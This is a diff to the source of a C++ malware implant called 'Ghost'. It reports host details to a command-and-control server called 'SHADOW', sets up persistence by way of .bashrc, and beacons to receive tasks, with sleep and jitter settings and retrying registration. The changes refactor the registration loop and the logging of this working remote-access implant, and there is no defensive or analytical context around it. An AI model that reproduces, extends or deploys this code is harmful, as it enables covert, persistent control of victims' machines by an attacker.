@@ -22,18 +22,16 @@ private:
     std::vector<TaskResultDto> pendingResults;
 
 public:
-    // a potential problem with UUID arises if the implant gets reinstalled
-    // it'll cause it to generate a new uuid
-    // SHADOW won't know it's the same one
-    // TODO: how to combat this?
     Ghost(std::string ip, int port)
         : uuid(Utils::generateUuid()),
         hostname(Utils::getHostname()),
         client(ip, port),
         currentSleepInterval(DEFAULT_SLEEP_SEC),
-        currentJitterPercent(JITTER_PERCENT) {}
+        currentJitterPercent(DEFAULT_JITTER_PERCENT) {
+        LOG_SUCCESS("GHOST up on {}", OS_PLATFORM)
+    }
 
-    bool registerGhost() {
+    void registerGhost() {
         LOG_INFO("Trying to register with SHADOW")
 
         GhostDto registrationPayload;
@@ -41,24 +39,23 @@ public:
         registrationPayload.hostname = hostname;
         registrationPayload.os = OS_PLATFORM;
 
-        std::string response = client.sendHttpRequest("POST", "/api/v1/ghost/register", registrationPayload.toJson());
+        while (true) {
+            std::string response = client.sendHttpRequest("POST", "/api/v1/ghost/register", registrationPayload.toJson());
+            if (!response.empty()) {
+                LOG_SUCCESS("Successfully registered with UUID {}, hostname {} and os {}", uuid, hostname, OS_PLATFORM)
+                return;
+            }
 
-        // TODO: ideally get back some sort of a config, but for now just get any data
-        // TODO: make this check the reponse code instead
-        if (!response.empty()) {
-            LOG_SUCCESS("REGISTRATION SUCCESSFUL")
-            return true;
+            std::this_thread::sleep_for(std::chrono::seconds(currentSleepInterval));
         }
-
-        return false; 
     }
 
     void persist() {
         // TOOD: chose from different persistence methods/try them one-by-one
         // TODO: parametrize for builder
+        LOG_INFO("[PERSISTENCE] Trying .bashrc...")
         if (Persistence::bashrc() == 0) {
             LOG_SUCCESS("Persistence established")
-
             return;
         }
 
@@ -81,7 +78,7 @@ public:
                 pendingResults.clear();
 
                 HeartbeatResponseDto instructions = HeartbeatResponseDto::fromJson(rawResponse);
-                std::cout << "WOW " << instructions.sleepInterval << " " << instructions.jitterPercent << " " << instructions.tasks.size() << "\n";
+                LOG_INFO("Received config with {}s sleep interval, {} jitter \% and {} tasks", instructions.sleepInterval, instructions.jitterPercent, instructions.tasks.size())
 
                 if (instructions.sleepInterval > 0) {
                     currentSleepInterval = instructions.sleepInterval;
@@ -134,18 +131,10 @@ private:
 int main() {
     srand(time(0));
 
-    LOG_SUCCESS("GHOST up on {}", OS_PLATFORM)
-
     Ghost ghost(SHADOW_IP, SHADOW_PORT);
 
     ghost.persist();
-
-    // try to register with SHADOW
-    while (!ghost.registerGhost()) {
-        std::this_thread::sleep_for(std::chrono::seconds(5));
-    }
-
-    // for now just beacon
+    ghost.registerGhost();
     ghost.beacon();
 
     return 0;
